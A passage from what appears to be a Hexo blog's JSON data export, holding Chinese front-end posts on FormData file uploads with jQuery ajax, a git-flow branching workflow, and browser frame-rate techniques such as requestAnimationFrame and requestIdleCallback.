class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> formData = <span class=\"keyword\">new</span> FormData();</span><br><span class=\"line\">formData.append(<span class=\"string\">\"brandId\"</span>, <span class=\"keyword\">this</span>.dialog.selectBrand);</span><br><span class=\"line\">formData.append(<span class=\"string\">\"type\"</span>, <span class=\"keyword\">this</span>.dialog.selectType);</span><br><span class=\"line\">formData.append(<span class=\"string\">\"file\"</span>, <span class=\"keyword\">this</span>.dialog.file);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$proxy(&#123;</span><br><span class=\"line\">  url: <span class=\"string\">\"/pgsls/kol/addExcel\"</span>,</span><br><span class=\"line\">  type: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">  data: formData,</span><br><span class=\"line\">  cache: <span class=\"literal\">false</span>,</span><br><span class=\"line\">  processData: <span class=\"literal\">false</span>,</span><br><span class=\"line\">  contentType: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"cacah-false\"><a href=\"#cacah-false\" class=\"headerlink\" title=\"cacah:false\"></a>cacah:false</h5><ul>\n<li>cache 设为 false 可以禁止浏览器对该 URL（以及对应的 HTTP 方法）的缓存。 jQuery 通过为 URL 添加一个冗余参数来实现。</li>\n<li>该方法只对 GET 和 HEAD 起作用，然而 IE8 会缓存之前的 GET 结果来响应 POST 请求。 这里设置 cache: false 是为了兼容 IE8。</li>\n</ul>\n<h5 id=\"contentType：false\"><a href=\"#contentType：false\" class=\"headerlink\" title=\"contentType：false\"></a>contentType：false</h5><ul>\n<li>jq 的 contentType 默认值是 application/x-www-form-urlencoded,因此传给 data 参数的对象会默认转换为 query string</li>\n<li>我们不需要 jq 做这个转换，否则会破坏掉 multipart/form-data 的编码格式。所以设置 false 来禁止 jq 的转换操作</li>\n</ul>\n<h5 id=\"processData-false\"><a href=\"#processData-false\" class=\"headerlink\" title=\"processData:false\"></a>processData:false</h5><ul>\n<li>jq 会将 data 对象转换为字符串来发送 http 请求，默认情况会用 application/x-www-form-urlencoded 编码转换</li>\n<li>我们设置 contentType:false 后该转换会失败。因此设置 processData:false 来禁止这个转换过程（相当于双层保险）</li>\n<li>data 本来就是用 formData 编码好的数据，不需要进行字符串转换</li>\n</ul>\n<h2 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a>兼容性</h2><ul>\n<li>由于 formdata 对象是 XMLHttpRequest Level2 接口，需要 IE 10+, Firefox 4.0+, Chrome 7+, Safari 5+, Opera 12+</li>\n<li>低版本浏览器只能用 form 表单了</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>因为发现用 postman 很轻松的就可以选择 file 类型</li>\n<li>但是 ajax 直接 data 提交键值对却是报不合法的</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//报错的</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.$proxy(&#123;</span><br><span class=\"line\">  url: <span class=\"string\">\"/pgsls/kol/addExcel\"</span>,</span><br><span class=\"line\">  type: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    brandId: <span class=\"string\">\"1\"</span>,</span><br><span class=\"line\">    type: <span class=\"string\">\"1\"</span>,</span><br><span class=\"line\">    file: file <span class=\"comment\">//文件类型</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li>因为要上传类型是文件（二进制数据，而 http 提供的基于文本的通信协议），所以请求头的 Content-Type 要改成 multipart/form-data(默认是 application/x-www-form-urlencoded)</li>\n<li>input 的 file 类型可以通过 change 事件来获取 file 对象（event.target.files）</li>\n</ul>\n<h3 id=\"HTTP-请求实体\"><a href=\"#HTTP-请求实体\" class=\"headerlink\" title=\"HTTP 请求实体\"></a>HTTP 请求实体</h3><blockquote>\n<p>每个字段由一段 boundary string 来分隔，浏览器保证该 boundary string 不与内容重复,因而 multipart/form-data 能够成功编码二进制数据</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"brandId\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"type\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"file\"</span>; filename=<span class=\"string\">\"test.xlsx\"</span></span><br><span class=\"line\">Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe--</span><br></pre></td></tr></table></figure>\n<ul>\n<li>说一下为什么这里文件只有文件名，没有文件路径？</li>\n<li>按照浏览器的安全策略，网页是不能获取到一个文件的完整路径。因为网页开发者可能从这个路径获取到其他信息，甚至发起攻击。</li>\n</ul>\n<h3 id=\"实际发送\"><a href=\"#实际发送\" class=\"headerlink\" title=\"实际发送\"></a>实际发送</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> formData = <span class=\"keyword\">new</span> FormData();</span><br><span class=\"line\">formData.append(<span class=\"string\">\"brandId\"</span>, <span class=\"keyword\">this</span>.dialog.selectBrand);</span><br><span class=\"line\">formData.append(<span class=\"string\">\"type\"</span>, <span class=\"keyword\">this</span>.dialog.selectType);</span><br><span class=\"line\">formData.append(<span class=\"string\">\"file\"</span>, <span class=\"keyword\">this</span>.dialog.file);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$proxy(&#123;</span><br><span class=\"line\">  url: <span class=\"string\">\"/pgsls/kol/addExcel\"</span>,</span><br><span class=\"line\">  type: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">  data: formData,</span><br><span class=\"line\">  cache: <span class=\"literal\">false</span>,</span><br><span class=\"line\">  processData: <span class=\"literal\">false</span>,</span><br><span class=\"line\">  contentType: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"cacah-false\"><a href=\"#cacah-false\" class=\"headerlink\" title=\"cacah:false\"></a>cacah:false</h5><ul>\n<li>cache 设为 false 可以禁止浏览器对该 URL（以及对应的 HTTP 方法）的缓存。 jQuery 通过为 URL 添加一个冗余参数来实现。</li>\n<li>该方法只对 GET 和 HEAD 起作用，然而 IE8 会缓存之前的 GET 结果来响应 POST 请求。 这里设置 cache: false 是为了兼容 IE8。</li>\n</ul>\n<h5 id=\"contentType：false\"><a href=\"#contentType：false\" class=\"headerlink\" title=\"contentType：false\"></a>contentType：false</h5><ul>\n<li>jq 的 contentType 默认值是 application/x-www-form-urlencoded,因此传给 data 参数的对象会默认转换为 query string</li>\n<li>我们不需要 jq 做这个转换，否则会破坏掉 multipart/form-data 的编码格式。所以设置 false 来禁止 jq 的转换操作</li>\n</ul>\n<h5 id=\"processData-false\"><a href=\"#processData-false\" class=\"headerlink\" title=\"processData:false\"></a>processData:false</h5><ul>\n<li>jq 会将 data 对象转换为字符串来发送 http 请求，默认情况会用 application/x-www-form-urlencoded 编码转换</li>\n<li>我们设置 contentType:false 后该转换会失败。因此设置 processData:false 来禁止这个转换过程（相当于双层保险）</li>\n<li>data 本来就是用 formData 编码好的数据，不需要进行字符串转换</li>\n</ul>\n<h2 id=\"兼容性\"><a href=\"#兼容性\" class=\"headerlink\" title=\"兼容性\"></a>兼容性</h2><ul>\n<li>由于 formdata 对象是 XMLHttpRequest Level2 接口，需要 IE 10+, Firefox 4.0+, Chrome 7+, Safari 5+, Opera 12+</li>\n<li>低版本浏览器只能用 form 表单了</li>\n</ul>\n"},{"title":"分支规范使用（git flow）","date":"2019-01-08T14:50:54.000Z","_content":"\n# 安装方式\n\n- mac 下，brew install git-flow-avh(该模型比较好，具有 bugfix 分支)\n\n# 使用方式\n\n- 前期工作：需要在 wiki 上建立相关发布日志，记录每次版本\n- changelog（该记录一般为产品或项目在迭代周期开始之前指定之需求）\n- git flow init(初始化)\n\n### 场景 1\n\n> 产品迭代周期的开始——产品经理提出了一堆新功能（可以说一个功能【jira】对应一个 feature 分支），新建 feature 分支到完成发布的生命周期如下\n\n1.git flow feature start 180827-radar109（新建分支 feature/180827-radar109 并切换）\n\n2.git flow feature publish 180827-radar109 (将该版本推到远程仓库，便于小伙伴获取)\n\n3.git flow feature finish 180827-radar109（完成该功能分支，并删除。同时切回 develop 分支）\n\n4.发布测试平台交由提测，假设测试通过，直接跳到 7。测试不通过有 bug，跳到 5。\n\n5.git flow bugfix start 180827-radar109(新建分支 bugfix/180827-radar109 并切换，也许测试提出了新的 jira 来修改，这里不一定是 109)\n\n6.与 2-3 步骤类似\n\n7.每天中午自己的分支拉一遍 develop 分支（防止自己的 feature/bugfix 分支不是最新）\n\n8.产品经理提出的所有新功能，小伙伴全部完成之后。跟产品经理确认这个周期不再有新的功能，同时他在灰度测试平台确认可以发布线上，该周期基本结束。\n\n9.git flow release start 产品版本（从 develop 分支新建 release/产品版本）\n\n10.git flow release publish 产品版本（发布到远程仓库，便于大家进行小修小改，无需进行 bugfix 分支，这是因为之前 4 步骤针对每个 feature 已经提测，这里理论上只是小修改如文案不到位之类）\n\n11.release 版本发布正式平台，一天时间缓冲进行 UAT 测试，若无问题第二天进行第 11 步骤，若有问题直接针对该 release 分支修改\n\n12.git flow release finish 产品版本（完成 release 分支，并合并到 develop 和 master 分支，同时使用该版本名字打 tag）\n\n13.在 wiki 某角落，写下该周期之发布记录。同时使用 release 脚本运行记录。\n\n14.发布平台使用 master 分支，发布所有线上机器。\n\n### 场景 2\n\n> 产品经理或者客户提出线上有 bug，需要立刻修改的作法如下\n\n- 需要注意，hotfix 大多是紧急情况，测试人员有可能不到位，这里更多依赖自测，然后直接发布 master\n\n  1.git flow hotfix start 版本名字-专有名字（可能有多个 hotfix 给多个小伙伴修改，这里会从 master 切出分支 hotfix/版本名字-专有名字）\n\n  2.git flow hotfix publish 版本名字-专有名字（push 到远程仓库，万一小伙伴突然有事或者电脑挂了，其他小伙伴可以接力改）\n\n  3.git flow hotfix finish 版本名字-专有名字（合并到 master 分支，并对 hotfix 版本打 tag，然后删除）\n\n  4.发布平台使用 master 分支，发布所有线上机器。\n\n### 场景 3\n\n> 项目经理和客户确认可能只有两个里程碑节点，这时候迭代周期如何确定\n\n1.内部和项目经理制定更为详细的周期节点，或使用石墨管理，或使用 wiki 管理（工具只是手段）每个周期内更细致的需求，多个周期节点的制定有利于发布线上，给项目整体以信心\n\n2.如果两个里程碑节点发布线上（线上只会存活两次正式版本），大家认为已经足够，则无须讨论\n\n3.具体情况具体分析，重要的是人而不是死板的步骤\n\n### 场景 4\n\n> 产品在迭代周期中间变更部分需求\n\n1.视需求变更的复杂度而定，如果影响到周期结束时间，可以和产品经理商量修改结束时间，如果时间不能更改，则寻求更多的资源（研发，加班）\n\n2.频繁变更需求则应拒绝，请产品思考清楚\n","source":"_posts/git-branch-use.md","raw":"---\ntitle: 分支规范使用（git flow）\ndate: 2019-01-08 22:50:54\ntags: git\n---\n\n# 安装方式\n\n- mac 下，brew install git-flow-avh(该模型比较好，具有 bugfix 分支)\n\n# 使用方式\n\n- 前期工作：需要在 wiki 上建立相关发布日志，记录每次版本\n- changelog（该记录一般为产品或项目在迭代周期开始之前指定之需求）\n- git flow init(初始化)\n\n### 场景 1\n\n> 产品迭代周期的开始——产品经理提出了一堆新功能（可以说一个功能【jira】对应一个 feature 分支），新建 feature 分支到完成发布的生命周期如下\n\n1.git flow feature start 180827-radar109（新建分支 feature/180827-radar109 并切换）\n\n2.git flow feature publish 180827-radar109 (将该版本推到远程仓库，便于小伙伴获取)\n\n3.git flow feature finish 180827-radar109（完成该功能分支，并删除。同时切回 develop 分支）\n\n4.发布测试平台交由提测，假设测试通过，直接跳到 7。测试不通过有 bug，跳到 5。\n\n5.git flow bugfix start 180827-radar109(新建分支 bugfix/180827-radar109 并切换，也许测试提出了新的 jira 来修改，这里不一定是 109)\n\n6.与 2-3 步骤类似\n\n7.每天中午自己的分支拉一遍 develop 分支（防止自己的 feature/bugfix 分支不是最新）\n\n8.产品经理提出的所有新功能，小伙伴全部完成之后。跟产品经理确认这个周期不再有新的功能，同时他在灰度测试平台确认可以发布线上，该周期基本结束。\n\n9.git flow release start 产品版本（从 develop 分支新建 release/产品版本）\n\n10.git flow release publish 产品版本（发布到远程仓库，便于大家进行小修小改，无需进行 bugfix 分支，这是因为之前 4 步骤针对每个 feature 已经提测，这里理论上只是小修改如文案不到位之类）\n\n11.release 版本发布正式平台，一天时间缓冲进行 UAT 测试，若无问题第二天进行第 11 步骤，若有问题直接针对该 release 分支修改\n\n12.git flow release finish 产品版本（完成 release 分支，并合并到 develop 和 master 分支，同时使用该版本名字打 tag）\n\n13.在 wiki 某角落，写下该周期之发布记录。同时使用 release 脚本运行记录。\n\n14.发布平台使用 master 分支，发布所有线上机器。\n\n### 场景 2\n\n> 产品经理或者客户提出线上有 bug，需要立刻修改的作法如下\n\n- 需要注意，hotfix 大多是紧急情况，测试人员有可能不到位，这里更多依赖自测，然后直接发布 master\n\n  1.git flow hotfix start 版本名字-专有名字（可能有多个 hotfix 给多个小伙伴修改，这里会从 master 切出分支 hotfix/版本名字-专有名字）\n\n  2.git flow hotfix publish 版本名字-专有名字（push 到远程仓库，万一小伙伴突然有事或者电脑挂了，其他小伙伴可以接力改）\n\n  3.git flow hotfix finish 版本名字-专有名字（合并到 master 分支，并对 hotfix 版本打 tag，然后删除）\n\n  4.发布平台使用 master 分支，发布所有线上机器。\n\n### 场景 3\n\n> 项目经理和客户确认可能只有两个里程碑节点，这时候迭代周期如何确定\n\n1.内部和项目经理制定更为详细的周期节点，或使用石墨管理，或使用 wiki 管理（工具只是手段）每个周期内更细致的需求，多个周期节点的制定有利于发布线上，给项目整体以信心\n\n2.如果两个里程碑节点发布线上（线上只会存活两次正式版本），大家认为已经足够，则无须讨论\n\n3.具体情况具体分析，重要的是人而不是死板的步骤\n\n### 场景 4\n\n> 产品在迭代周期中间变更部分需求\n\n1.视需求变更的复杂度而定，如果影响到周期结束时间，可以和产品经理商量修改结束时间，如果时间不能更改，则寻求更多的资源（研发，加班）\n\n2.频繁变更需求则应拒绝，请产品思考清楚\n","slug":"git-branch-use","published":1,"updated":"2019-02-26T15:24:07.334Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jy000n0iof36a3oixa","content":"<h1 id=\"安装方式\"><a href=\"#安装方式\" class=\"headerlink\" title=\"安装方式\"></a>安装方式</h1><ul>\n<li>mac 下，brew install git-flow-avh(该模型比较好，具有 bugfix 分支)</li>\n</ul>\n<h1 id=\"使用方式\"><a href=\"#使用方式\" class=\"headerlink\" title=\"使用方式\"></a>使用方式</h1><ul>\n<li>前期工作：需要在 wiki 上建立相关发布日志，记录每次版本</li>\n<li>changelog（该记录一般为产品或项目在迭代周期开始之前指定之需求）</li>\n<li>git flow init(初始化)</li>\n</ul>\n<h3 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景 1\"></a>场景 1</h3><blockquote>\n<p>产品迭代周期的开始——产品经理提出了一堆新功能（可以说一个功能【jira】对应一个 feature 分支），新建 feature 分支到完成发布的生命周期如下</p>\n</blockquote>\n<p>1.git flow feature start 180827-radar109（新建分支 feature/180827-radar109 并切换）</p>\n<p>2.git flow feature publish 180827-radar109 (将该版本推到远程仓库，便于小伙伴获取)</p>\n<p>3.git flow feature finish 180827-radar109（完成该功能分支，并删除。同时切回 develop 分支）</p>\n<p>4.发布测试平台交由提测，假设测试通过，直接跳到 7。测试不通过有 bug，跳到 5。</p>\n<p>5.git flow bugfix start 180827-radar109(新建分支 bugfix/180827-radar109 并切换，也许测试提出了新的 jira 来修改，这里不一定是 109)</p>\n<p>6.与 2-3 步骤类似</p>\n<p>7.每天中午自己的分支拉一遍 develop 分支（防止自己的 feature/bugfix 分支不是最新）</p>\n<p>8.产品经理提出的所有新功能，小伙伴全部完成之后。跟产品经理确认这个周期不再有新的功能，同时他在灰度测试平台确认可以发布线上，该周期基本结束。</p>\n<p>9.git flow release start 产品版本（从 develop 分支新建 release/产品版本）</p>\n<p>10.git flow release publish 产品版本（发布到远程仓库，便于大家进行小修小改，无需进行 bugfix 分支，这是因为之前 4 步骤针对每个 feature 已经提测，这里理论上只是小修改如文案不到位之类）</p>\n<p>11.release 版本发布正式平台，一天时间缓冲进行 UAT 测试，若无问题第二天进行第 11 步骤，若有问题直接针对该 release 分支修改</p>\n<p>12.git flow release finish 产品版本（完成 release 分支，并合并到 develop 和 master 分支，同时使用该版本名字打 tag）</p>\n<p>13.在 wiki 某角落，写下该周期之发布记录。同时使用 release 脚本运行记录。</p>\n<p>14.发布平台使用 master 分支，发布所有线上机器。</p>\n<h3 id=\"场景-2\"><a href=\"#场景-2\" class=\"headerlink\" title=\"场景 2\"></a>场景 2</h3><blockquote>\n<p>产品经理或者客户提出线上有 bug，需要立刻修改的作法如下</p>\n</blockquote>\n<ul>\n<li><p>需要注意，hotfix 大多是紧急情况，测试人员有可能不到位，这里更多依赖自测，然后直接发布 master</p>\n<p>1.git flow hotfix start 版本名字-专有名字（可能有多个 hotfix 给多个小伙伴修改，这里会从 master 切出分支 hotfix/版本名字-专有名字）</p>\n<p>2.git flow hotfix publish 版本名字-专有名字（push 到远程仓库，万一小伙伴突然有事或者电脑挂了，其他小伙伴可以接力改）</p>\n<p>3.git flow hotfix finish 版本名字-专有名字（合并到 master 分支，并对 hotfix 版本打 tag，然后删除）</p>\n<p>4.发布平台使用 master 分支，发布所有线上机器。</p>\n</li>\n</ul>\n<h3 id=\"场景-3\"><a href=\"#场景-3\" class=\"headerlink\" title=\"场景 3\"></a>场景 3</h3><blockquote>\n<p>项目经理和客户确认可能只有两个里程碑节点，这时候迭代周期如何确定</p>\n</blockquote>\n<p>1.内部和项目经理制定更为详细的周期节点，或使用石墨管理，或使用 wiki 管理（工具只是手段）每个周期内更细致的需求，多个周期节点的制定有利于发布线上，给项目整体以信心</p>\n<p>2.如果两个里程碑节点发布线上（线上只会存活两次正式版本），大家认为已经足够，则无须讨论</p>\n<p>3.具体情况具体分析，重要的是人而不是死板的步骤</p>\n<h3 id=\"场景-4\"><a href=\"#场景-4\" class=\"headerlink\" title=\"场景 4\"></a>场景 4</h3><blockquote>\n<p>产品在迭代周期中间变更部分需求</p>\n</blockquote>\n<p>1.视需求变更的复杂度而定，如果影响到周期结束时间，可以和产品经理商量修改结束时间，如果时间不能更改，则寻求更多的资源（研发，加班）</p>\n<p>2.频繁变更需求则应拒绝，请产品思考清楚</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"安装方式\"><a href=\"#安装方式\" class=\"headerlink\" title=\"安装方式\"></a>安装方式</h1><ul>\n<li>mac 下，brew install git-flow-avh(该模型比较好，具有 bugfix 分支)</li>\n</ul>\n<h1 id=\"使用方式\"><a href=\"#使用方式\" class=\"headerlink\" title=\"使用方式\"></a>使用方式</h1><ul>\n<li>前期工作：需要在 wiki 上建立相关发布日志，记录每次版本</li>\n<li>changelog（该记录一般为产品或项目在迭代周期开始之前指定之需求）</li>\n<li>git flow init(初始化)</li>\n</ul>\n<h3 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景 1\"></a>场景 1</h3><blockquote>\n<p>产品迭代周期的开始——产品经理提出了一堆新功能（可以说一个功能【jira】对应一个 feature 分支），新建 feature 分支到完成发布的生命周期如下</p>\n</blockquote>\n<p>1.git flow feature start 180827-radar109（新建分支 feature/180827-radar109 并切换）</p>\n<p>2.git flow feature publish 180827-radar109 (将该版本推到远程仓库，便于小伙伴获取)</p>\n<p>3.git flow feature finish 180827-radar109（完成该功能分支，并删除。同时切回 develop 分支）</p>\n<p>4.发布测试平台交由提测，假设测试通过，直接跳到 7。测试不通过有 bug，跳到 5。</p>\n<p>5.git flow bugfix start 180827-radar109(新建分支 bugfix/180827-radar109 并切换，也许测试提出了新的 jira 来修改，这里不一定是 109)</p>\n<p>6.与 2-3 步骤类似</p>\n<p>7.每天中午自己的分支拉一遍 develop 分支（防止自己的 feature/bugfix 分支不是最新）</p>\n<p>8.产品经理提出的所有新功能，小伙伴全部完成之后。跟产品经理确认这个周期不再有新的功能，同时他在灰度测试平台确认可以发布线上，该周期基本结束。</p>\n<p>9.git flow release start 产品版本（从 develop 分支新建 release/产品版本）</p>\n<p>10.git flow release publish 产品版本（发布到远程仓库，便于大家进行小修小改，无需进行 bugfix 分支，这是因为之前 4 步骤针对每个 feature 已经提测，这里理论上只是小修改如文案不到位之类）</p>\n<p>11.release 版本发布正式平台，一天时间缓冲进行 UAT 测试，若无问题第二天进行第 11 步骤，若有问题直接针对该 release 分支修改</p>\n<p>12.git flow release finish 产品版本（完成 release 分支，并合并到 develop 和 master 分支，同时使用该版本名字打 tag）</p>\n<p>13.在 wiki 某角落，写下该周期之发布记录。同时使用 release 脚本运行记录。</p>\n<p>14.发布平台使用 master 分支，发布所有线上机器。</p>\n<h3 id=\"场景-2\"><a href=\"#场景-2\" class=\"headerlink\" title=\"场景 2\"></a>场景 2</h3><blockquote>\n<p>产品经理或者客户提出线上有 bug，需要立刻修改的作法如下</p>\n</blockquote>\n<ul>\n<li><p>需要注意，hotfix 大多是紧急情况，测试人员有可能不到位，这里更多依赖自测，然后直接发布 master</p>\n<p>1.git flow hotfix start 版本名字-专有名字（可能有多个 hotfix 给多个小伙伴修改，这里会从 master 切出分支 hotfix/版本名字-专有名字）</p>\n<p>2.git flow hotfix publish 版本名字-专有名字（push 到远程仓库，万一小伙伴突然有事或者电脑挂了，其他小伙伴可以接力改）</p>\n<p>3.git flow hotfix finish 版本名字-专有名字（合并到 master 分支，并对 hotfix 版本打 tag，然后删除）</p>\n<p>4.发布平台使用 master 分支，发布所有线上机器。</p>\n</li>\n</ul>\n<h3 id=\"场景-3\"><a href=\"#场景-3\" class=\"headerlink\" title=\"场景 3\"></a>场景 3</h3><blockquote>\n<p>项目经理和客户确认可能只有两个里程碑节点，这时候迭代周期如何确定</p>\n</blockquote>\n<p>1.内部和项目经理制定更为详细的周期节点，或使用石墨管理，或使用 wiki 管理（工具只是手段）每个周期内更细致的需求，多个周期节点的制定有利于发布线上，给项目整体以信心</p>\n<p>2.如果两个里程碑节点发布线上（线上只会存活两次正式版本），大家认为已经足够，则无须讨论</p>\n<p>3.具体情况具体分析，重要的是人而不是死板的步骤</p>\n<h3 id=\"场景-4\"><a href=\"#场景-4\" class=\"headerlink\" title=\"场景 4\"></a>场景 4</h3><blockquote>\n<p>产品在迭代周期中间变更部分需求</p>\n</blockquote>\n<p>1.视需求变更的复杂度而定，如果影响到周期结束时间，可以和产品经理商量修改结束时间，如果时间不能更改，则寻求更多的资源（研发，加班）</p>\n<p>2.频繁变更需求则应拒绝，请产品思考清楚</p>\n"},{"title":"动画了解一下（二）","date":"2017-12-13T03:23:45.000Z","_content":"\n## fps\n\n* fps 是 frame per second，一秒能够重新渲染多少个画面\n* 网页的每一帧都是一次重新渲染，一帧（frame）就是一个画面。\n* 我们平时看电视，电视上的画面连续播放，其实一个画面接着一个画面的，如果一秒有 60 个画面播放，我们看着就很流畅了。如果一秒 10 个画面，可能就会感觉像在跳机械舞一样，一顿一顿的\n* 现在大多数显示器的刷新频率都是 60Hz，浏览器一般也会自动按照这个频率，刷新动画。\n* 所以网页动画能够做到每秒 60 帧，就可以和显示器同步刷新，视觉效果达到最佳。\n* 一秒之内进行 60 次渲染，每次不能超过 16.66 毫秒\n\n> 如果想要到 60 帧的刷新率，那么 js 线程每个任务的耗时，必须少于 16ms。一个解决办法是用 web worker，主线程只用于 ui 渲染，其他和 ui 渲染不想干的任务，都放在 worker 线程。\n\n## 调节渲染\n\n> 有一些 js 方法可以调节重新渲染，大幅度提高网页性能\n\n### requestAnimationFrame\n\n* 他可以将代码放到下次重新渲染执行\n\n```javascript\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n  element.style.height = currentHeight * 2 + \"px\";\n}\nelements.forEach(doubleHeight);\n//读了马上又去写，这就会马上重排，导致重新渲染，这就对网页性能很不利\n//可以使用window.requestAnimation把读写操作分离，把所有写操作放到下一次浏览器正常的重新渲染\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n  window.requestAnimationFrame(function() {\n    element.style.height = currentHeight * 2 + \"px\";\n  });\n}\nelements.forEach(doubleHeight);\n```\n\n* 适用于页面滚动事件，推迟到下一次重新渲染\n* 适用于网页动画，比如\n\n```javascript\n//元素一帧旋转一度\nvar rAF = window.requestAnimationFrame;\n\nvar degrees = 0;\nfunction update() {\n  div.style.transform = \"rotate(\" + degrees + \"deg)\";\n  console.log(\"updated to degrees \" + degrees);\n  degrees = degrees + 1;\n  rAF(update);\n}\nrAF(update);\n```\n\n### requestIdleCallback\n\n> 只有当一帧的末尾有空闲时间，才会执行回调\n\n* requestIdleCallback(fn)\n* 因为一秒 60 帧，一帧就 16.66ms，只有当前帧的运行时间小于 16.66ms 的时候，fn 才会执行。如果当前没有空闲时间，就推迟到下一帧，直到有空闲时间为止。\n* requestIdleCallback(fn，5000)可以制定第二个参数，表示指定的 ms，表示这段时间内，如果每一帧都没有空间时间，fn 将强制执行\n\n---\n\n> [网页性能管理详解](http://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html)\n","source":"_posts/fps.md","raw":"---\ntitle: 动画了解一下（二）\ndate: 2017-12-13 11:23:45\ntags: css\n---\n\n## fps\n\n* fps 是 frame per second，一秒能够重新渲染多少个画面\n* 网页的每一帧都是一次重新渲染，一帧（frame）就是一个画面。\n* 我们平时看电视，电视上的画面连续播放，其实一个画面接着一个画面的，如果一秒有 60 个画面播放，我们看着就很流畅了。如果一秒 10 个画面，可能就会感觉像在跳机械舞一样，一顿一顿的\n* 现在大多数显示器的刷新频率都是 60Hz，浏览器一般也会自动按照这个频率，刷新动画。\n* 所以网页动画能够做到每秒 60 帧，就可以和显示器同步刷新，视觉效果达到最佳。\n* 一秒之内进行 60 次渲染，每次不能超过 16.66 毫秒\n\n> 如果想要到 60 帧的刷新率，那么 js 线程每个任务的耗时，必须少于 16ms。一个解决办法是用 web worker，主线程只用于 ui 渲染，其他和 ui 渲染不想干的任务，都放在 worker 线程。\n\n## 调节渲染\n\n> 有一些 js 方法可以调节重新渲染，大幅度提高网页性能\n\n### requestAnimationFrame\n\n* 他可以将代码放到下次重新渲染执行\n\n```javascript\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n  element.style.height = currentHeight * 2 + \"px\";\n}\nelements.forEach(doubleHeight);\n//读了马上又去写，这就会马上重排，导致重新渲染，这就对网页性能很不利\n//可以使用window.requestAnimation把读写操作分离，把所有写操作放到下一次浏览器正常的重新渲染\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n  window.requestAnimationFrame(function() {\n    element.style.height = currentHeight * 2 + \"px\";\n  });\n}\nelements.forEach(doubleHeight);\n```\n\n* 适用于页面滚动事件，推迟到下一次重新渲染\n* 适用于网页动画，比如\n\n```javascript\n//元素一帧旋转一度\nvar rAF = window.requestAnimationFrame;\n\nvar degrees = 0;\nfunction update() {\n  div.style.transform = \"rotate(\" + degrees + \"deg)\";\n  console.log(\"updated to degrees \" + degrees);\n  degrees = degrees + 1;\n  rAF(update);\n}\nrAF(update);\n```\n\n### requestIdleCallback\n\n> 只有当一帧的末尾有空闲时间，才会执行回调\n\n* requestIdleCallback(fn)\n* 因为一秒 60 帧，一帧就 16.66ms，只有当前帧的运行时间小于 16.66ms 的时候，fn 才会执行。如果当前没有空闲时间，就推迟到下一帧，直到有空闲时间为止。\n* requestIdleCallback(fn，5000)可以制定第二个参数，表示指定的 ms，表示这段时间内，如果每一帧都没有空间时间，fn 